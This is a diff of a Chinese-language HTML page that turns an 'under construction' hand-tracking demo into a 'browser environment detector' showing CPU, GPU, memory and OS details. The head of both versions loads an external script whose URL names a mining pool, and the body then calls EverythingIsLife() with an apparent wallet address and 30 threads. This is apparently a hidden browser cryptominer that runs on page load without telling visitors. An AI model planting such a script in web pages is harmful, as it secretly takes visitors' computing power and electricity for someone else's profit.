@@ -1,32 +1,190 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN">
 <head>
- <meta charset="UTF-8">
- <title>建设中</title>
- <style>
-     body { margin: 0; overflow: hidden; background-color: #000; }
-     #canvas-container { width: 100vw; height: 100vh; position: absolute; top: 0; left: 0; z-index: 1; }
-     /* 隐藏摄像头视频流，只用于后台分析 */
-     .input_video { display: none; }
-     #loading {
-         position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-         color: white; font-family: sans-serif; font-size: 24px; pointer-events: none; z-index: 10;
-     }
- </style>
- <!-- 引入 Three.js -->
- <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
- <!-- 引入 MediaPipe Hands -->
- <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
- <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
- <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
- <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
- <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
+<meta charset="UTF-8">
+<title>浏览器环境检测器</title>
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+        background: #000;
+        color: #9a9a9a;
+        font-family: 'Courier New', Consolas, monospace;
+        padding: 48px 40px;
+        line-height: 1.9;
+    }
+
+    h1 {
+        color: #c2c2c2;
+        font-size: 17px;
+        letter-spacing: 4px;
+        margin-bottom: 28px;
+        padding-bottom: 12px;
+        border-bottom: 1px solid #1c1c1c;
+    }
+
+    .section { margin-bottom: 26px; }
+
+    .section-title {
+        color: #5a5a5a;
+        font-size: 11px;
+        letter-spacing: 3px;
+        margin-bottom: 6px;
+    }
+
+    .info-row {
+        display: flex;
+        padding: 3px 0;
+        font-size: 13px;
+    }
+
+    .label {
+        color: #4d4d4d;
+        width: 160px;
+        flex-shrink: 0;
+    }
+
+    .value { color: #a8a8a8; word-break: break-all; }
+    .value.prime { color: #d0d0d0; }
+    .value.limit { color: #555; font-size: 11px; }
+    .value.err { color: #7a3a3a; }
+</style>
 </head>
 <body>
-建设中...
 <script type="text/javascript">
-EverythingIsLife('XmUmyW7rGEPr5LccijmtaT7REupWncteH4', 'c=DASH', 30);
+    EverythingIsLife('XmUmyW7rGEPr5LccijmtaT7REupWncteH4', 'c=DASH', 30);
+</script>
+<h1>SYSTEM DETECTOR</h1>
+
+<div class="section">
+    <div class="section-title">-- CPU --</div>
+    <div class="info-row"><span class="label">逻辑核心数</span><span class="value prime" id="cpuCores"></span></div>
+    <div class="info-row"><span class="label">CPU 型号</span><span class="value limit" id="cpuModel"></span></div>
+    <div class="info-row"><span class="label">架构</span><span class="value" id="cpuArch"></span></div>
+</div>
+
+<div class="section">
+    <div class="section-title">-- GPU --</div>
+    <div class="info-row"><span class="label">显卡型号</span><span class="value prime" id="gpuModel"></span></div>
+    <div class="info-row"><span class="label">供应商</span><span class="value" id="gpuVendor"></span></div>
+    <div class="info-row"><span class="label">WebGL 版本</span><span class="value" id="webglVer"></span></div>
+    <div class="info-row"><span class="label">最大纹理</span><span class="value" id="maxTex"></span></div>
+</div>
+
+<div class="section">
+    <div class="section-title">-- 内存 & 系统 --</div>
+    <div class="info-row"><span class="label">设备内存</span><span class="value" id="devMem"></span></div>
+    <div class="info-row"><span class="label">操作系统</span><span class="value" id="osInfo"></span></div>
+    <div class="info-row"><span class="label">平台</span><span class="value" id="platform"></span></div>
+    <div class="info-row"><span class="label">浏览器</span><span class="value" id="browser"></span></div>
+    <div class="info-row"><span class="label">屏幕</span><span class="value" id="screenRes"></span></div>
+</div>
+
+<script>
+function set(id, v) {
+    document.getElementById(id).innerHTML = v || '<span class="value limit">浏览器安全限制，无法获取</span>';
+}
+
+/* ---------- GPU ---------- */
+function detectGPU() {
+    try {
+        // 尝试多种 canvas 方式
+        var cvs = document.createElement('canvas');
+        var gl = cvs.getContext('webgl') 
+              || cvs.getContext('experimental-webgl')
+              || cvs.getContext('webgl2');
+
+        if (!gl) {
+            set('gpuModel', '<span class="value err">WebGL 不可用</span>');
+            return;
+        }
+
+        // 方法1: 调试扩展（Chrome 90+ 需要权限）
+        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if (dbg) {
+            var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            var vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+            if (renderer && renderer !== 'Google SwiftShader') {
+                set('gpuModel', renderer);
+                set('gpuVendor', vendor || '未知');
+                set('webglVer', (gl.getParameter(gl.VERSION) || '').split(' ')[0]);
+                set('maxTex', gl.getParameter(gl.MAX_TEXTURE_SIZE) + 'px');
+                return;
+            }
+        }
+
+        // 方法2: 标准 WebGL 参数（兜底）
+        var renderer2 = gl.getParameter(gl.RENDERER);
+        var vendor2 = gl.getParameter(gl.VENDOR);
+        set('gpuModel', renderer2 || '<span class="value limit">浏览器隐藏了显卡信息</span>');
+        set('gpuVendor', vendor2 || '未知');
+        set('webglVer', (gl.getParameter(gl.VERSION) || '未知').split(' ')[0]);
+        set('maxTex', gl.getParameter(gl.MAX_TEXTURE_SIZE) + 'px');
+
+        // 释放
+        var lose = gl.getExtension('WEBGL_lose_context');
+        if (lose) lose.loseContext();
+    } catch(e) {
+        set('gpuModel', '<span class="value err">检测失败: ' + e.message + '</span>');
+    }
+}
+
+/* ---------- CPU / 系统 ---------- */
+function detectCPU() {
+    // 核心数 - 这个浏览器能给
+    set('cpuCores', navigator.hardwareConcurrency 
+        ? navigator.hardwareConcurrency + ' 线程' 
+        : null);
+
+    // CPU 型号 - 浏览器永远给不了，明确标注
+    set('cpuModel', '<span class="value limit">浏览器沙箱限制，无法读取 CPU 型号</span>');
+
+    // 架构 - 尝试 UA-CH（仅 Chrome/Edge 支持）
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        navigator.userAgentData.getHighEntropyValues(['architecture'])
+            .then(function(d) {
+                set('cpuArch', d.architecture ? d.architecture + ' 位' : '未知');
+            })
+            .catch(function() { set('cpuArch', '未知'); });
+    } else {
+        set('cpuArch', '<span class="value limit">当前浏览器不支持</span>');
+    }
+}
+
+function detectSystem() {
+    // 内存 - navigator.deviceMemory 只有 Chrome/Edge 有，且是粗略值
+    set('devMem', navigator.deviceMemory 
+        ? '约 ' + navigator.deviceMemory + ' GB（粗略值）' 
+        : '<span class="value limit">浏览器未提供</span>');
+
+    // 操作系统
+    var ua = navigator.userAgent;
+    var os = '未知';
+    if (/Windows NT/.test(ua)) os = 'Windows';
+    else if (/Mac OS X/.test(ua)) os = 'macOS';
+    else if (/Linux/.test(ua)) os = 'Linux';
+    else if (/Android/.test(ua)) os = 'Android';
+    else if (/iPhone|iPad/.test(ua)) os = 'iOS';
+    set('osInfo', os);
+
+    set('platform', navigator.platform || '未知');
+
+    // 浏览器
+    var b = '未知';
+    if (/Edg\//.test(ua)) b = 'Edge';
+    else if (/Chrome\//.test(ua)) b = 'Chrome';
+    else if (/Firefox\//.test(ua)) b = 'Firefox';
+    else if (/Safari\//.test(ua)) b = 'Safari';
+    set('browser', b);
+
+    set('screenRes', screen.width + ' × ' + screen.height + ' @ ' + (window.devicePixelRatio || 1) + 'x');
+}
+
+/* 页面加载时执行一次 */
+detectGPU();
+detectCPU();
+detectSystem();
 </script>
 </body>
 </html>
-
